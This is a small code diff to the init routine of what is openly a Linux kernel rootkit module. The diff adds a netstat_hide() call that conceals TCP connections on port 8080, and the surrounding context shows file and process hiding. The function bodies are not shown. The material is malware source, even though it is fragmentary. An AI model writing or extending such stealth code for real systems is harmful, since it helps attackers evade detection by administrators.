@@ -29,6 +29,9 @@ static int __init start_rootkit(void)
         return -1;
     }
     printk(KERN_ALERT "rk: hide file secsessfully!");
+    //HIDE TCP ON PORT 8080
+    ret = netstat_hide();
+
     //PROCESS HIDE
     ret = process_hide();
     if (ret==-1)
